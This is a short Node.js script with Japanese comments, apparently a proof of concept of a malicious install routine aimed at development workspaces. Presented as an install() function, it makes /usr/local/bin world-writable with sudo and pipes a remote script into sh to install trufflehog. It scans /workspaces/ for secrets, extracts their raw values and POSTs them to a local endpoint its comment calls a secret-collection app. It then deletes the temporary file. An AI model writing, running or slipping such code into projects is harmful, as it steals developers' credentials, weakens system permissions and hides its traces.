const { execSync } = require("child_process");
const fs = require("fs");

async function install() {
  try {
    // trufflehogコマンドを実行できるようにするためにbinのパーミッションを変更
    execSync("sudo chmod 777 -R /usr/local/bin");

    // trufflehogのダウンロードとパスを通す
    execSync(`curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin`);

    // trufflehogコマンドを実行して見つけたシークレットを取得
    const result = execSync(`trufflehog filesystem /workspaces/ --json | grep '"Raw":"' | grep -o '"Raw":"[^"]*"' | sed 's/"Raw":"\\(.*\\)"/\\1/' | sed 's/\\\\n/\\n/g'`, {
      shell: '/bin/bash',
      encoding: 'utf8'
    });

    // 結果をinfo.txtに保存
    fs.writeFileSync('info.txt', result);

    const fileInfo = fs.readFileSync("info.txt", "utf-8");
    // シークレット取得アプリにPOSTリクエストで送信
    await fetch("http://localhost:3000/info", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ info: fileInfo }),
    });

    // info.txtを削除
    execSync("rm info.txt");

  } catch (error) {
    console.error("Installation failed:", error);
  }
}

install();